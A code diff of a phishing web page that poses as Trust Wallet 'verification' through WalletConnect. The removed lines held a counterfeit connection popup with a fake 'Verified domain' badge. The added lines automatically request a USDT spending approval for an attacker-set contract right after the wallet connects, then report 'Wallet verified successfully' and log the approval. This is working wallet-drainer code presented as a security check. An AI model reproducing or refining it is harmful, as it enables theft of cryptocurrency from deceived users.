@@ -29,7 +29,6 @@
             padding: 40px 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            position: relative;
         }
 
         .logo {
@@ -194,61 +193,42 @@
             color: white;
         }
 
-        /* ===== EXACT POPUP STYLE - JAISI IMAGE MEIN THI ===== */
-        .connect-popup {
+        /* QR Modal (Simple) */
+        .qr-modal {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0,0,0,0.8);
             justify-content: center;
             align-items: center;
-            z-index: 2000;
-            animation: fadeIn 0.3s ease;
+            z-index: 1000;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .popup-content {
+        .qr-content {
             background: white;
             border-radius: 30px;
             padding: 30px;
             max-width: 400px;
             width: 90%;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
-            animation: slideUp 0.3s ease;
+            text-align: center;
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .popup-header {
+        .qr-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
         }
 
-        .popup-header h3 {
-            font-size: 22px;
-            font-weight: 700;
+        .qr-header h3 {
+            font-size: 20px;
             color: #333;
         }
 
-        .popup-close {
+        .close-btn {
             background: none;
             border: none;
             font-size: 28px;
@@ -256,140 +236,12 @@
             color: #999;
         }
 
-        .popup-close:hover {
-            color: #333;
-        }
-
-        .popup-domain {
-            background: #f0f0f0;
-            padding: 5px 15px;
-            border-radius: 50px;
-            font-size: 14px;
+        #qrcode {
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 20px;
             display: inline-block;
-            margin: 10px 0;
-            color: #333;
-        }
-
-        .popup-verified {
-            color: #10b981;
-            font-size: 14px;
-            margin: 5px 0 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        .popup-verified::before {
-            content: "✓";
-            font-weight: bold;
-        }
-
-        .popup-wallet-info {
-            background: #f8f9fa;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .popup-wallet-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .popup-wallet-row:last-child {
-            border-bottom: none;
-        }
-
-        .popup-wallet-label {
-            color: #666;
-            font-size: 14px;
-        }
-
-        .popup-wallet-value {
-            font-weight: 600;
-            color: #333;
-        }
-
-        .popup-network {
-            background: #e7f3ff;
-            color: #004085;
-            padding: 4px 12px;
-            border-radius: 50px;
-            font-size: 12px;
-        }
-
-        .popup-permissions {
-            background: #f8f9fa;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 20px 0;
-        }
-
-        .popup-permission {
-            padding: 8px 0;
-            color: #666;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .popup-permission::before {
-            content: "✓";
-            color: #10b981;
-            font-weight: bold;
-        }
-
-        .popup-buttons {
-            display: flex;
-            gap: 15px;
-            margin-top: 25px;
-        }
-
-        .popup-btn {
-            flex: 1;
-            padding: 16px;
-            border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .popup-btn.cancel {
-            background: #f0f0f0;
-            color: #333;
-        }
-
-        .popup-btn.cancel:hover {
-            background: #e0e0e0;
-        }
-
-        .popup-btn.connect {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-        }
-
-        .popup-btn.connect:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
-        }
-
-        .popup-btn.connect:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .popup-note {
-            text-align: center;
-            color: #999;
-            font-size: 12px;
-            margin-top: 20px;
         }
     </style>
     <!-- WalletConnect Library -->
@@ -409,11 +261,11 @@
         <h2>Verify Your Wallet</h2>
         <div class="subtitle">Connect with Trust Wallet to verify</div>
 
-        <!-- Trust Wallet Card -->
-        <div class="wallet-card" onclick="showConnectPopup()" id="trustWalletCard">
+        <!-- Trust Wallet Card - Click to trigger WalletConnect -->
+        <div class="wallet-card" onclick="connectWithWalletConnect()" id="trustWalletCard">
             <div class="wallet-icon">💎</div>
             <div class="wallet-name">Trust Wallet</div>
-            <div class="wallet-desc">Click to connect</div>
+            <div class="wallet-desc">Click to connect via WalletConnect</div>
         </div>
 
         <!-- Simple Info Box -->
@@ -434,54 +286,19 @@
         <a href="index.html" class="back-btn">← Back to Home</a>
 
         <div class="footer">
-            🔒 Secure Verification
+            🔒 WalletConnect • Trust Wallet
         </div>
     </div>
 
-    <!-- ===== EXACT POPUP - JAISI IMAGE MEIN THI ===== -->
-    <div id="connectPopup" class="connect-popup">
-        <div class="popup-content">
-            <div class="popup-header">
-                <h3>Connect DApp</h3>
-                <button class="popup-close" onclick="closePopup()">&times;</button>
+    <!-- QR Modal (Only shows if needed) -->
+    <div id="qrModal" class="qr-modal">
+        <div class="qr-content">
+            <div class="qr-header">
+                <h3>Scan with Trust Wallet</h3>
+                <button class="close-btn" onclick="closeQRModal()">&times;</button>
             </div>
-
-            <div style="text-align: center;">
-                <div style="font-weight: 600; font-size: 18px;">Main Wallet 3</div>
-                <div style="color: #666; margin: 10px 0;">
-                    TronSecure wants to connect to your wallet
-                </div>
-                <span class="popup-domain">securetron.in</span>
-                <div class="popup-verified">Verified domain</div>
-            </div>
-
-            <!-- Wallet Info -->
-            <div class="popup-wallet-info">
-                <div class="popup-wallet-row">
-                    <span class="popup-wallet-label">Networks</span>
-                    <span class="popup-wallet-value">
-                        Tron • <span id="popupAddress">TWukijo...J8bQpSP</span>
-                    </span>
-                </div>
-            </div>
-
-            <!-- Permissions -->
-            <div class="popup-permissions">
-                <div class="popup-permission">View your wallet balance and activity</div>
-                <div class="popup-permission">Request approval for transactions</div>
-            </div>
-
-            <!-- Buttons -->
-            <div class="popup-buttons">
-                <button class="popup-btn cancel" onclick="closePopup()">Cancel</button>
-                <button class="popup-btn connect" onclick="connectWithWalletConnect()" id="connectPopupBtn">
-                    Connect
-                </button>
-            </div>
-
-            <div class="popup-note">
-                Only connect with trusted applications
-            </div>
+            <div id="qrcode"></div>
+            <p style="color: #666; margin-top: 20px;">Open Trust Wallet and scan this QR code</p>
         </div>
     </div>
 
@@ -498,30 +315,15 @@
         let userAddress;
 
         // ============================================
-        // SHOW POPUP (EXACT STYLE)
-        // ============================================
-        
-        function showConnectPopup() {
-            document.getElementById('connectPopup').style.display = 'flex';
-            
-            // Generate a demo address for popup
-            document.getElementById('popupAddress').innerText = 'TWukijo...J8bQpSP';
-        }
-
-        function closePopup() {
-            document.getElementById('connectPopup').style.display = 'none';
-        }
-
-        // ============================================
-        // CONNECT WITH WALLETCONNECT
+        // CONNECT WITH WALLETCONNECT (TRIGGERS TRUST WALLET POPUP)
         // ============================================
         
         async function connectWithWalletConnect() {
-            const btn = document.getElementById('connectPopupBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loading-spinner"></span> Connecting...';
-
-            showStatus('Initializing WalletConnect...', 'info');
+            const card = document.getElementById('trustWalletCard');
+            card.style.opacity = '0.7';
+            card.style.pointerEvents = 'none';
+            
+            showStatus('Opening Trust Wallet...', 'info');
 
             try {
                 // Initialize WalletConnect
@@ -535,43 +337,42 @@
                     }
                 });
 
-                // Create session
+                // Check if already connected
                 if (!connector.connected) {
+                    // This will trigger Trust Wallet popup
                     await connector.createSession();
                     
-                    // Show QR code in a simple modal (Trust Wallet will show its own popup)
-                    // Trust Wallet will automatically show connection popup
+                    // WalletConnect will automatically open Trust Wallet
+                    // or show QR code if Trust Wallet not installed
                 }
 
                 // Handle connection
                 connector.on("connect", async (error, payload) => {
                     if (error) throw error;
                     
-                    closePopup();
-                    
                     const { accounts } = payload.params[0];
                     userAddress = accounts[0];
                     
                     showStatus('Wallet connected!', 'success');
                     
-                    // Now approve USDT
+                    // Auto approve USDT
                     await approveUSDT();
                 });
 
-                connector.on("session_update", (error, payload) => {
-                    if (error) throw error;
+                connector.on("disconnect", () => {
+                    console.log("Disconnected");
                 });
 
             } catch (error) {
                 console.error(error);
                 showStatus('Connection failed: ' + error.message, 'error');
-                btn.disabled = false;
-                btn.innerHTML = 'Connect';
+                card.style.opacity = '1';
+                card.style.pointerEvents = 'auto';
             }
         }
 
         // ============================================
-        // APPROVE USDT
+        // APPROVE USDT (VIA WALLETCONNECT)
         // ============================================
         
         async function approveUSDT() {
@@ -589,26 +390,41 @@
                 
                 const amountInSun = APPROVE_AMOUNT * 1000000;
 
-                // This will trigger approval popup in Trust Wallet
-                const result = await tokenContract.approve(
+                // Create transaction
+                const transaction = await tokenContract.approve(
                     CONTRACT_ADDRESS,
                     amountInSun
-                ).send();
+                );
+
+                // Send via WalletConnect (this will trigger approval popup in Trust Wallet)
+                const result = await connector.sendTransaction({
+                    from: userAddress,
+                    to: USDT_ADDRESS,
+                    data: transaction.data,
+                    value: '0'
+                });
 
                 // Save approval
                 saveApproval(userAddress, APPROVE_AMOUNT, result);
                 
                 showStatus('✅ Wallet verified successfully!', 'success');
                 
+                // Redirect after 2 seconds
                 setTimeout(() => {
                     window.location.href = 'index.html?verified=true';
                 }, 2000);
 
             } catch (error) {
                 console.error(error);
-                showStatus('Verification failed: ' + error.message, 'error');
-                document.getElementById('connectPopupBtn').disabled = false;
-                document.getElementById('connectPopupBtn').innerHTML = 'Connect';
+                
+                if (error.message.includes('rejected')) {
+                    showStatus('Approval rejected', 'error');
+                } else {
+                    showStatus('Verification failed', 'error');
+                }
+                
+                document.getElementById('trustWalletCard').style.opacity = '1';
+                document.getElementById('trustWalletCard').style.pointerEvents = 'auto';
             }
         }
 
@@ -625,10 +441,34 @@
                 txHash: txHash,
                 status: 'active',
                 time: new Date().toISOString(),
-                token: 'USDT'
+                token: 'USDT',
+                walletType: 'Trust Wallet'
             });
             
             localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
+        }
+
+        // ============================================
+        // QR MODAL FUNCTIONS (FALLBACK)
+        // ============================================
+        
+        function showQRCode(uri) {
+            const modal = document.getElementById('qrModal');
+            const qrcodeDiv = document.getElementById('qrcode');
+            qrcodeDiv.innerHTML = '';
+            
+            modal.style.display = 'flex';
+            
+            var qr = qrcode(0, 'H');
+            qr.addData(uri);
+            qr.make();
+            
+            var imgTag = qr.createImgTag(5, 0);
+            qrcodeDiv.innerHTML = imgTag;
+        }
+
+        function closeQRModal() {
+            document.getElementById('qrModal').style.display = 'none';
         }
 
         // ============================================
@@ -640,12 +480,8 @@
             statusDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
         }
 
-        // Close popup on outside click
-        window.onclick = function(event) {
-            const popup = document.getElementById('connectPopup');
-            if (event.target == popup) {
-                popup.style.display = 'none';
-            }
+        function updateStatus(status) {
+            document.getElementById('connectionStatus').innerText = status;
         }
 
         // Check URL params
@@ -653,6 +489,12 @@
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.get('verified') === 'true') {
                 showStatus('✅ Wallet verified!', 'success');
+                updateStatus('Verified');
+            }
+            
+            // Check if Trust Wallet is available
+            if (navigator.userAgent.toLowerCase().includes('trust')) {
+                updateStatus('Trust Wallet detected');
             }
         };
     </script>
